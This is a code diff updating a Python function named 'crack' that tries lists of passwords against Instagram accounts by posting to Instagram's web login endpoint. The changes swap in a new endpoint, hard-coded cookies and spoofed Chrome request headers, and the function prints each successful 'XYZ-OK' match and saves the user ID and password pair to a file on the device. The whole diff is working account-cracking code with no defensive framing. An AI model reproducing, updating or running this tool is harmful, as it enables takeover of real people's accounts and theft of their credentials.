@@ -138,43 +138,47 @@ def crack(uid, pww, total_idz):
     try:
         for pw in pww:
             session = requests.Session()
-            initial_response = session.get("https://www.instagram.com/accounts/login/")
-            csrf_token = initial_response.cookies.get("csrftoken")
-            time_now = int(time.time())
-            device_id = f"android-{str(uuid.uuid4())[:16]}"
-            adid = str(uuid.uuid4()) 
-            guid = str(uuid.uuid4()) 
-            phone_id = str(uuid.uuid4())
+            params = {'hl': 'en',}
+            cookies = {
+                'csrftoken': '4M2PbXXQYNEmDdxrQg01NL',
+                'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
+                'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
+                'ig_nrcb': '1',
+                'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
+                'wd': '885x773',}
             data = {
-                "username": uid,
                 "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}",
-                "queryParams": "{}",
-                "optIntoOneTap": False,
-                "stopDeletionNonce": "",
-                "trustedDeviceRecords": "{}",
-                "login_attempt_count": "0",
-                "device_id": device_id,
-                "adid": adid,
-                "guid": guid,
-                "phone_id": phone_id,
-                "login_nonce_map": "{}",
-                "big_blue_token": "",
-                "country_codes": "[{\"country_code\":\"1\",\"source\":[\"default\"]}]",
-                "jazoest": "22240",  # A calculated checksum, often needed for Instagram (value is an example)
-                "user_id": "",
-                "csrftoken": csrf_token,
-                "ds_user_id": "",
-                "_csrftoken": csrf_token,
-                "sessionid": ""}
+                'optIntoOneTap': 'false',
+                'queryParams': '{"hl":"en"}',
+                'trustedDeviceRecords': '{}',
+                'username': uid,}
             headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-                "X-Requested-With": "XMLHttpRequest",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "X-CSRFToken": csrf_token,
-                "Referer": "https://www.instagram.com/accounts/login/",
-                "Origin": "https://www.instagram.com",}
-            login_url = "https://www.instagram.com/accounts/login/ajax/"
-            response = requests.post(login_url, data=data, headers=headers).json()
+                'accept': '*/*',
+                'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://www.instagram.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.instagram.com/accounts/login/?hl=en',
+                'sec-ch-prefers-color-scheme': 'dark',
+                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.120", "Chromium";v="127.0.6533.120"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-model': '""',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-ch-ua-platform-version': '"10.0.0"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+                'x-asbd-id': '129477',
+                'x-csrftoken': '4M2PbXXQYNEmDdxrQg01NL',
+                'x-ig-app-id': '936619743392459',
+                'x-ig-www-claim': '0',
+                'x-instagram-ajax': '1015762410',
+                'x-requested-with': 'XMLHttpRequest',
+                'x-web-device-id': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',}
+            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
+            response = requests.post(login_url, data=data, headers=headers)
             if response.status_code == 200 and response.json().get("authenticated"):
                 print(f"\r\033[1;92m [XYZ-OK] {uid} | {pw}")
                 open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
